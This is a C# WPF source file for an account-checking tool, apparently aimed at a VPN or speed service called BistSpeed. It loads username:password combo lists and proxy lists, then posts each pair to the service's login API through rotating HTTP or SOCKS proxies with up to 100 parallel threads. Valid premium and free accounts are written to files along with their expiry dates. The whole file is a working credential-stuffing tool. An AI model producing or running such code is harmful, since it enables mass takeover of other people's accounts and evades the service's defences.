using HtmlAgilityPack;
using Leaf.xNet;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace _20Speed_Tools
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            stop.IsEnabled = false;
        }

        private void Grid_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
                DragMove();
        }

        private void exit_Click(object sender, RoutedEventArgs e)
        {
            var Mess = MessageBox.Show("To Exit Program Are You Sure ?", "Exit Program", MessageBoxButton.YesNo, MessageBoxImage.Warning);

            if (Mess == MessageBoxResult.Yes)
            {
                Application.Current.Shutdown();
            }
        }

        private void stop_Click(object sender, RoutedEventArgs e)
        {
            Source.Cancel();
            Dispatcher.Invoke(new Action(() =>
            {
                stop.IsEnabled = false;

            }));
            Dispatcher.Invoke(new Action(() =>
            {
                start.IsEnabled = true;
            }));
        }
        CancellationTokenSource Source;
        private void start_Click(object sender, RoutedEventArgs e)
        {
            XCreateFolder();
            Task.Factory.StartNew(XStart);
        }
        private void XStart()
        {
            if (Combo.Count != 0)
            {
                Dispatcher.Invoke(new Action(() =>
                {
                    start.IsEnabled = false;
                }));

                Dispatcher.Invoke(new Action(() =>
                {
                    stop.IsEnabled = true;
                }));

                Source = new CancellationTokenSource();

                ParallelOptions Op = new ParallelOptions();

                Op.CancellationToken = Source.Token;
                if (Combo.Count > 100)
                    Op.MaxDegreeOfParallelism = 100;
                else
                    Op.MaxDegreeOfParallelism = 1;

                Parallel.ForEach(Combo, Op, Acc =>
                {
                    Op.CancellationToken.ThrowIfCancellationRequested();
                    XChecker(Acc);
                });
            }
        }

        List<string> Proxy = new List<string>();
        private void loadproxy_Click(object sender, RoutedEventArgs e)
        {
            Proxy.Clear();
            var Dig = new OpenFileDialog();
            Dig.Filter = "Text File (*.txt)|*.txt";
            Dig.Title = "Load Proxy";

            var Result = Dig.ShowDialog();

            if (Result == true)
            {
                Proxy.AddRange(File.ReadAllLines(Dig.FileName));

                if (Proxy.Count != 0)
                {
                    lblloadproxy.Content = $"Load Proxy: {Proxy.Count}";
                }
                else
                {
                    Proxy.Clear();
                    MessageBox.Show("List Is Null. (Load Agen)", "Error", MessageBoxButton.OK, MessageBoxImage.Warning);
                }
            }
        }

        List<string> Combo = new List<string>();
        private void loadcombo_Click(object sender, RoutedEventArgs e)
        {
            Combo.Clear();
            var Dig = new OpenFileDialog();
            Dig.Filter = "Text File (*.txt)|*.txt";
            Dig.Title = "Load Combo";

            var Result = Dig.ShowDialog();

            if (Result == true)
            {
                Combo.AddRange(File.ReadAllLines(Dig.FileName));

                if (Combo.Count != 0)
                {
                    lblloadcombo.Content = $"Load Combo: {Combo.Count}";
                }
                else
                {
                    Combo.Clear();
                    MessageBox.Show("List Is Null. (Load Agen)", "Error", MessageBoxButton.OK, MessageBoxImage.Warning);
                }
            }
        }


        int Good;
        int Free;
        int Bad;
        int Check;
        int Error;
        int BadProxy;
        int DallerPrice;

        private Random Rnd = new Random();

        private string XRandomProxy()
        {
            return Convert.ToString(Proxy[Rnd.Next(0, Proxy.Count)]);
        }

        private string XBalance(int Days)
        {
            var Toman = Days * 1000;
            var Dal = Toman / 30000;
            return $"{Dal}$";
        }

        private void XChecker(string Account)
        {

            if (Combo.Count != 0)
            {
            X:
                try
                {
                    var Us = Account.Split(':')[0].Trim();
                    var Ps = Account.Split(':')[1].Trim();

                    var PostData = $"action=getUserInfo&apicode=kweinsh239sjn%25@*&username={Us}&password={Ps}&gadget=BistSpeedWindows&app_version=920&data=";

                    var Req = new HttpRequest();

                    Req.IgnoreProtocolErrors = true;
                    Req.UserAgent = Http.ChromeUserAgent();

                    Dispatcher.Invoke(new Action(() =>
                    {

                        if (ProxyBox.Text == "Http/s")
                            Req.Proxy = HttpProxyClient.Parse(XRandomProxy());
                        else if (ProxyBox.Text == "Socks4")
                            Req.Proxy = Socks4ProxyClient.Parse(XRandomProxy());
                        else if (ProxyBox.Text == "Socks5")
                            Req.Proxy = Socks5ProxyClient.Parse(XRandomProxy()); ;
                    }));

                    var Res = Req.Post("https://orisythirp.live/ibs.php", Encoding.UTF8.GetBytes(PostData), "application/x-www-form-urlencoded").ToString();

                    Check++;

                    Dispatcher.Invoke(new Action(() =>
                    {
                        lblcheck.Content = $"Checke: {Check}";
                    }));

                    if (Res.Contains("isValid\":true"))
                    {
                        if (Res.Contains("expired\":false"))
                        {
                            Good++;

                            var Days = int.Parse(Regex.Match(Res, "day\":(.*?),").Groups[1].Value);

                            var ExpiredDay = Regex.Match(Res, "gregorian\":\"(.*?)\"").Groups[1].Value.Replace("\\", "");

                            Dispatcher.Invoke(new Action(() =>
                            {
                                HitBox.Text += $"\r\n<***********[Good Account]***********>\r\nUserName: {Us}\r\nPassWord: {Ps}\r\nType: Peremume\r\n<***********[Info]***********>\r\nExpiredDay: {ExpiredDay}\r\nDays: {Days}\r\nBalans: {XBalance(Days)}\r\n<***********[The End]***********>\r\n";
                                lblgood.Content = $"Good: {Good}";
                            }));
                            GoodAcc.Add($"\r\n<***********[Good Account]***********>\r\nUserName: {Us}\r\nPassWord: {Ps}\r\nType: Peremume\r\n<***********[Info]***********>\r\nExpiredDay: {ExpiredDay}\r\nDays: {Days}\r\nBalans: {XBalance(Days)}\r\n<***********[The End]***********>\r\n");
                            File.WriteAllLines(@$"{FolderName}/GoodAccount.txt", GoodAcc);
                        }
                        else
                        {
                            Free++;

                            Dispatcher.Invoke(new Action(() =>
                            {
                                HitBox.Text += $"\r\n<***********[Free Account]***********>\r\nUserName: {Us}\r\nPassWord: {Ps}\r\nType: FreeAccount\r\n<***********[The End]***********>\r\n";
                                lblfree.Content = $"Free: {Free}";
                            }));
                            FreeAcc.Add($"\r\n<***********[Free Account]***********>\r\nUserName: {Us}\r\nPassWord: {Ps}\r\nType: FreeAccount\r\n<***********[The End]***********>\r\n");

                            File.WriteAllLines(@$"{FolderName}/FreeAccount.txt",FreeAcc);
                        }
                    }
                    else if (Res.Contains("isValid\":false"))
                    {
                        Bad++;
                        Dispatcher.Invoke(new Action(() =>
                        {
                            lblbad.Content = $"Bad: {Bad}";
                        }));
                    }
                    else
                    {
                        Error++;
                        Dispatcher.Invoke(new Action(() =>
                        {
                            lblerror.Content = $"Error: {Error}";
                        }));
                    }
                }
                catch
                {
                    BadProxy++;
                    Dispatcher.Invoke(new Action(() =>
                    {
                        lblbadproxy.Content = $"Bad Proxy: {BadProxy}";
                    }));
                    goto X;
                }
            }
            else
                MessageBox.Show("Please Load Combo Or Proxy.", "Load Content", MessageBoxButton.OK, MessageBoxImage.Warning);
        }

        private void XGetDalerPrice()
        {
            var Html = new HtmlWeb();
            var Doc = Html.Load("https://www.tgju.org/");
            var Price = Doc.DocumentNode.SelectSingleNode("//*[@id=\"l-price_dollar_rl\"]/span[1]/span").InnerHtml.Split(',')[0].Trim();

            DallerPrice = int.Parse(Price) * 100;
        }

        List<string> GoodAcc = new List<string>();
        List<string> FreeAcc = new List<string>();

        public string FolderName = DateTime.Now.ToString("yyyy.MM.dd.mm.ss");

        private void XCreateFolder()
        {
            Directory.CreateDirectory(FolderName);
        }
    }
}
